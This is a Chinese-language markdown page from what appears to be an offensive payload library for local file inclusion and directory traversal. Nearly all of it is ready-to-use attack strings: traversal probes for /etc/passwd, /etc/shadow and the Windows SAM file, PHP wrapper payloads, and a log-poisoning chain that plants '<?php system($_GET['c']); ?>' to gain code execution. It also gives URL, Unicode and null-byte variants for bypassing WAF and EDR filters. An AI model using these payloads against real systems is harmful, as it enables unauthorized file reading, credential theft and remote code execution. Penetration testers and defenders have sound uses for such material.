# LFI 基础 / 目录遍历技术 payload 库

> 父文档:[00-index.md](00-index.md)
> 涵盖:本地文件包含基础 + 目录遍历技术(`../`、编码、null byte、点斜变体)。任何文件路径入参先打这两类。

---

## A. 本地文件包含基础

### 本地文件包含  `lfi-basic`
本地文件包含漏洞利用技术
子类：**本地包含** · tags: `lfi` `local` `file` `inclusion`

**前置条件：** 存在文件包含功能；用户可控制包含路径

**攻击链：**

**1. 1. 探测LFI**
_探测本地文件包含_
```
?file=../../../etc/passwd
?file=....//....//....//etc/passwd
?file=..\..\..\windows\win.ini
?page=php://filter/convert.base64-encode/resource=index.php
```

**2. 2. 读取敏感文件**  _[linux]_
_读取Linux敏感文件_
```
../../../etc/passwd
../../../etc/shadow
../../../var/log/apache2/access.log
../../../proc/self/environ
../../../proc/self/cmdline
```

**3. 3. PHP伪协议**
_使用PHP伪协议_
```
php://filter/convert.base64-encode/resource=config.php
php://input (POST数据作为输入)
php://data://text/plain,<?php phpinfo();?>
phar://archive.zip/shell.php
```

**4. 4. 日志投毒**  _[linux]_
_通过日志投毒获取RCE_
```
1. 包含日志文件: ../../../var/log/apache2/access.log
2. 在User-Agent中注入: <?php system($_GET['c']); ?>
3. 访问: ?file=../../../var/log/apache2/access.log&c=id
```

**WAF/EDR 绕过变体：**

**1. 目录遍历绕过**
_绕过目录遍历过滤_
```
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
....\/....\/....\/etc/passwd
```

**2. 后缀绕过**
_绕过文件后缀检查_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd/.jpg
php://filter/convert.base64-encode/resource=config.php%00
```

---


---

## B. 目录遍历技术

### 目录遍历技术  `lfi-traversal`
LFI目录遍历绕过技术
子类：**目录遍历** · tags: `lfi` `traversal` `bypass` `path`

**前置条件：** 存在LFI漏洞；存在路径过滤

**攻击链：**

**1. 1. 基础遍历**
_基础目录遍历_
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..\..\..\windows\win.ini
```

**2. 2. 绕过删除../**
_绕过删除../的过滤_
```
....//....//....//etc/passwd
....//....//etc/passwd
..././..././..././etc/passwd
```

**3. 3. URL编码绕过**
_URL编码绕过_
```
..%2f..%2f..%2fetc/passwd
..%252f..%252f..%252fetc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
```

**4. 4. Unicode编码绕过**
_Unicode编码绕过_
```
..%c0%af..%c0%af..%c0%afetc/passwd
..%c1%9c..%c1%9c..%c1%9cwindows\win.ini
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd
```

**5. 5. 绝对路径绕过**
_使用绝对路径_
```
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
C:/windows/win.ini
C:\windows\system32\config\sam
```

**WAF/EDR 绕过变体：**

**1. 混合编码**
_混合编码绕过_
```
..%2f..%c0%af..%2fetc/passwd
%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**2. 空字节截断**
_空字节截断绕过后缀_
```
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.html
```

**3. 点号截断(Windows)**  _[windows]_
_Windows点号截断_
```
../../../windows/win.ini.
../../../windows/win.ini...
../../../boot.ini……
```

---


---

← 回 [00-index.md](00-index.md) · 相关:[`12-php-wrappers.md`](12-php-wrappers.md)(PHP 场景下的伪协议进阶)
